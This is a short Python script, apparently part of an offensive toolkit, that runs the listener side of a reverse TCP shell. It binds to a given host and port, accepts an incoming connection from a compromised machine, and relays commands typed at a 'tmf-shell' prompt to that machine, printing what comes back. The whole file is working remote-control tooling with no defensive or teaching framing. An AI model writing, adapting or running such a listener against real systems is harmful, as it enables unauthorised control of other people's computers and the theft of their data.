import sys
import socket
import colorama
import time
import os
import datetime
from colorama import Fore
colorama.init()
if len(sys.argv) < 3:
    sys.exit()

timerun = datetime.datetime.now()
HOST = sys.argv[1]
PORT = int(sys.argv[2])

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))

s.listen(1)
while True:
    print(Fore.BLUE+'[*]'+Fore.RESET+f' Started Reverse TCP Connection At {HOST}:{PORT}')
    client = s.accept()
    print(Fore.YELLOW+'[*]'+Fore.RESET+f' Started Shell, Client Connected {client[1]} At ({timerun})')
    time.sleep(1)
    while True:
        cmd = input('\033[4mtmf\033[0m-\033[4mshell\033[0m > ').strip(" ")
        client[0].send(cmd.encode())
        if cmd.lower() in ['quit', 'exit']:
            break
        result = client[0].recv(1024).decode()
        print(result)
    client[0].close()
    cmd = input(Fore.CYAN+'[?]'+Fore.RESET+' Stop Connection? (Y/n): ') or 'n'
    if cmd.lower() in ['y', 'yes']:
        break
s.close()
